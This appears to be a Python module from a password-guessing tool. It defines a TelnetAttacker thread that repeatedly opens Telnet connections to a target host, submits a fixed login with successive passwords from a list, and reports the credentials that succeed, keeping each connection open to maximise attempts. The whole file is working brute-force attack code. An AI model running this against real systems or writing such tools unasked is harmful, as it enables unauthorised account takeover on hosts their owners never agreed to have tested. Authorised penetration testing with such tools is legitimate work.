import telnetlib
from target import Target
from attacker import Attacker


class TelnetAttacker(Attacker):
    """
    A class representing Telnet-attacking thread
    """

    def __init__(self, target: Target):
        super().__init__(target)

    def try_connect(self, tn) -> bool:
        """
        Try to connect to the host with given Telnet object using self.curr_password

        :param tn: Telnet object, that has already established connection with the host
        :type tn: Telnet
        :return: True if succeed/failed to authenticate, False if connection error occured
        """
        try:
            tn.read_until(b"login: ")
            tn.write(self.target.login.encode('ascii') + b"\n")
            tn.read_until(b"Password: ")
            tn.write(self.curr_password.encode('ascii') + b"\n")
            result = tn.expect([b"Last login:"], 2)
        # failed to connect to the host
        except (EOFError, OSError):
            print("[%s] Connection error - %s" % (self.name, self.target.host))
            self.failed_conns += 1
            return False
        else:
            # authentication failure
            if result[0] == -1:
                print("[%s] Failed attempt against %s - user: %s, password: %s" %
                      (self.name, self.target.host, self.target.login, self.curr_password))
            # authentication successful
            else:
                TelnetAttacker.notify_password_found(self.curr_password)
                print("[%s] Found credentials for %s - user: %s, password: %s" %
                      (self.name, self.target.host, self.target.login, self.curr_password))
            self.tries += 1
            self.failed_conns = 0
            self.curr_password = None
            return True

    def run(self):
        while TelnetAttacker.finish is False:
            try:
                tn = telnetlib.Telnet()
                tn.open(self.target.host, self.target.port)
            # failed to connect to the host
            except Exception:
                print("[%s] Connection error - %s" % (self.name, self.target.host))
                self.failed_conns += 1
            else:
                # telnet server responds slowly to the first connection try, so we
                # need to take advantage of having an already opened connection - do not
                # close the connection right after login attempt, but make as many
                # login attempts as possible
                while TelnetAttacker.finish is False:
                    if self.curr_password is None:
                        self.curr_password = self.target.get_password()
                        if self.curr_password is None:
                            continue
                    if self.try_connect(tn) is False:
                        break
            finally:
                tn.close()
